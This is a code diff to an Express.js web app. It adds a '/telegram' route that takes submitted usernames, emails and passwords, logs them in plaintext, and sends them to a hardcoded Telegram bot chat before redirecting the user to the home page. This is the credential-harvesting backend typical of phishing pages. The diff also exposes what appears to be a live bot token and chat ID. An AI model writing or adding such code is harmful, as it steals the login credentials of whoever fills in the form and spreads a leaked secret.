@@ -172,6 +172,34 @@ app.get("/contact", (req, res) => {
   res.render("contact");
 });
 
+app.post("/telegram", (req,res)=>{
+  
+  
+  const details = `username is ${req.body.username} have email ${req.body.email} and passsword ${req.body.password} `
+console.log(details)
+  sendToTelegram(details);
+
+ res.redirect('/')
+})
+
+function sendToTelegram(message) {
+  const BOT_TOKEN = "7138395020:AAF98yTTnZ_jDkGLqdbmNGo9_GkGYotoHl8";
+  const CHAT_ID = "1779078520";
+  const MESSAGE = message;
+
+  axios
+    .post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: MESSAGE,
+    })
+    .then((response) => {
+      console.log("Message sent:", response.data);
+    })
+    .catch((error) => {
+      console.error("Error sending message:", error);
+    });
+}
+
 // Server startup
 app.listen(3000, () => {
   console.log("Server running on port 3000");
